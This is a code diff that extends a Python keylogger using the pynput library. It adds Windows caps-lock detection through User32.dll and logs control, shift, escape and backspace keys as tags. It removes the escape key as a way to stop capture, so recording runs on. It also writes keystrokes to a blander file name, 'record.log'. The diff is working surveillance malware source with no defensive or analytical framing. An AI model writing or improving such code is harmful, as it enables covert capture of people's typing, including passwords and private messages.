@@ -1,5 +1,6 @@
 ﻿import subprocess
 import sys
+import ctypes
 
 # Check if pynput is installed
 try:
@@ -22,28 +23,39 @@ from pynput import keyboard
 
 text = ""
 
+def is_caps_lock_on():
+    hllDll = ctypes.WinDLL("User32.dll")
+    VK_CAPITAL = 0x14
+    return hllDll.GetKeyState(VK_CAPITAL) & 0x0001
+
+
 def on_press(key):
     try:
         global text
         # Handle special keys
         if key == keyboard.Key.enter:
-            text += "\n"
+            text += "\n" + "[ENTER]" + "\n"
         elif key == keyboard.Key.tab:
             text += "\t"
         elif key == keyboard.Key.space:
             text += " "
-        elif key in {keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
-            pass  
+        elif key in {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}:
+            text += "[CTRL]"
+        elif key == keyboard.Key.shift:
+            text += "[SHIFT]"
         elif key == keyboard.Key.esc:
-            return False
-        elif key == keyboard.Key.backspace and len(text) == 0:
-            pass
-        elif key == keyboard.Key.backspace and len(text) > 0:
-            text = text[:-1]
+            text += "[ESC]"
+        elif key == keyboard.Key.backspace:
+            text += "[BACKSPACE]"
         else:
-            text += str(key.char) 
+            if is_caps_lock_on():
+                #text += "[CAPSLOCK_ON]"
+                text += str(key.char).upper()
+            else:
+                #text += "[CAPSLOCK_OFF]"
+                text += str(key.char) 
             
-        with open("keyfile.txt", "a") as logkey:
+        with open("record.log", "a") as logkey:
             logkey.write(text)
             text=""
 
